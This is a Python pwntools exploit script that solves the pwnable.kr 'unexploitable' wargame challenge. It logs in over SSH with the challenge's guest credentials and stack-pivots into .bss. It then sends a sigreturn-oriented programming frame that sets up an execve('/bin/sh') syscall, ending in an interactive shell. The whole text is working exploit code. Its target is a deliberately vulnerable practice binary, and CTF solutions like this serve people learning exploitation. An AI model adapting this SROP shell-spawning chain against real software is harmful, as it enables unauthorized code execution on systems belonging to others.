from pwn import *


elf = ELF('./unexploitable')
#s = process('./unexploitable')
s = ssh('unexploitable', 'pwnable.kr', port=2222, password='guest').process('unexploitable')

bss = elf.bss() + 0x100

pth = '/bin/sh\0'

mread = 0x40055b
pread = 0x400430
syscall = 0x400560
offset = 344

payload1 = 'A' * 0x10
payload1 += p64(bss)
payload1 += p64(mread)

payload2 = ''
payload2 += 'C' * 0x10
# Stack Start
payload2 += p64(0)
payload2 += p64(pread)
payload2 += p64(syscall)

# Sigreturn Start : 0x6001fb
payload2 += p64(0) * 13
payload2 += p64(bss - 0x10 + offset)  # RDI
payload2 += p64(0)   # RSI
payload2 += p64(0) * 2
payload2 += p64(0)
payload2 += p64(0x3b)   # RAX
payload2 += p64(0)
payload2 += p64(0)    # RSP
payload2 += p64(syscall) # RIP
payload2 += p64(0)
payload2 += p64(0x33)   # cs
payload2 += p64(0) * 14
payload2 += pth

payload3 = 'B' * 0xf

sleep(3.1)
s.send(payload1)
sleep(0.1)
s.send(payload2)
sleep(0.1)
s.send(payload3)

s.interactive()
